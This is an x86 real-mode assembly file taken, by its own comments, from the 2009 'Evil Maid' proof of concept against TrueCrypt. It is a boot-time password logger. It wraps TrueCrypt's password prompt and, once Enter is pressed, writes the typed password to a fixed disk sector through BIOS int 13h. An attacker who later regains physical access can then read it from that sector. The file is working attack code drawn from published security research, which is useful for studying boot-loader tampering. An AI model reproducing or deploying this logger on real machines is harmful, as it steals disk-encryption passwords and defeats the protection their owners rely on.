; Fully taken from evilmaid for TrueCrypt, by Johanna Rutkowska
; (except some comments)
; http://theinvisiblethings.blogspot.ch/2009/10/evil-maid-goes-after-truecrypt.html

cpu	686
use16

segment .text


GLOBAL	logger
GLOBAL	g_ulogger_code_size
GLOBAL	g_ucall_ask_password_delta_offset


%define TC_BIOS_KEY_ENTER 1ch

logger:	        
                push	bp
		mov	bp, sp
                push	word [bp+4]     ; &password
call_ask_password:
		call	$+3		; will be patched to "call AskPassword"
		add	sp, 2

		cmp	al, TC_BIOS_KEY_ENTER
		jnz	.exit

; From TrueCrypt headers
;typedef struct
;{
;	unsigned __int32 Length;
;	unsigned char Text[MAX_PASSWORD + 1];
;	char Pad[3]; // keep 64-bit alignment
;} Password;

		push	ax
		push	es

		push	ds
		pop	es


		mov	ax, 0301h	; write one sector
		mov	cx, 62		; number #61, disk offset 0x7a00
		mov	dx, 0080h
		mov	bx, word [bp+4] ; &password
		int	13h

		pop	es
		pop	ax

.exit:		pop	bp
		ret			; cdecl

g_ulogger_code_size	                dw	$-logger
g_ucall_ask_password_delta_offset	dw	call_ask_password-logger+1
